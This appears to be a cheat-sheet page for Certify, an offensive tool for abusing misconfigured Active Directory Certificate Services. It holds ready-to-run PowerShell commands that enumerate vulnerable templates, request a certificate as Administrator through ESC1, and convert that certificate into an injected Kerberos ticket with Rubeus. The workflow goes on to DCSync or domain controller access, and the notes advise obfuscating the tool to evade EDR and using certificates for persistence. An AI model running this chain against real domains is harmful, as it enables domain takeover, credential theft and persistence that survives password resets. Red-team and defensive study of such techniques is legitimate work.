---
tool: Certify
slug: certify
stages: [post-compromise]
targets: [windows]
category: AD CS enumeration and abuse (Windows)
platforms: [windows]
services: [ldap, http, https]
ports: [389, 80, 443]
tags: [adcs, certificates, esc1, esc8, kerberos, active directory, pkinit]
attack: [T1649, T1558]
summary: The Windows counterpart to Certipy: find and abuse misconfigured Active Directory Certificate Services from a domain-joined foothold. Enumerate the CA and its templates, spot the ESC flaws, then request a certificate as another user and turn it into their Kerberos TGT. The on-host path to escalation and persistence through AD CS.
references:
  - Certify on GitHub | https://github.com/GhostPack/Certify
  - SpecterOps — Certified Pre-Owned | https://posts.specterops.io/certified-pre-owned-d95910965cd2
---

## When to reach for it

You have a Windows foothold in a domain running AD CS and want to escalate using certificate misconfigurations instead of password attacks. Certify runs from the host, enumerates vulnerable templates, and requests a certificate you can trade for someone else's ticket — a clean route to Domain Admin or long-lived persistence.

## Key flags

- `find /vulnerable`: list templates with dangerous settings (ESC1–ESC8).
- `/ca:HOST\\CA-NAME`: target a specific certificate authority.
- `request /template:<name> /altname:<user>`: request a cert as another principal (ESC1).
- `/install` / `/thumbprint`: certificate management for the resulting PFX.
- Pair with `Rubeus asktgt /certificate:` to convert the cert into a TGT.

## Commands

Enumerate vulnerable templates:

```powershell
.\Certify.exe find /vulnerable
```

Request a certificate as a privileged user (ESC1 — template allows SAN):

```powershell
.\Certify.exe request /ca:HOST\CA-NAME /template:VulnTemplate /altname:Administrator
```

Convert the saved PFX into a Kerberos TGT with Rubeus:

```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:pass /ptt
```

## Workflow

1. `Certify.exe find /vulnerable` to identify the ESC flaw and the template name.
2. For ESC1, `request` a certificate with `/altname:` set to a privileged user.
3. Convert the PEM output to a PFX (`openssl`) if Rubeus needs it.
4. Feed the PFX to `Rubeus asktgt /ptt` to get and inject that user's TGT.
5. Use the ticket to DCSync or access the DC (see the Pass-the-Certificate and DCSync notes).

## Notes

Certify is the on-host, C#/BOF option; Certipy does the same from Linux with a credential or hash, so pick by where you have your foothold. ESC1 (templates that let the requester supply a Subject Alternative Name) is the classic quick win, but `find /vulnerable` surfaces the whole ESC1–ESC8 range. Like all GhostPack tools it is caught by EDR — run it as a BOF or obfuscate. Certificates stay valid even after a password reset, which makes this strong for persistence.
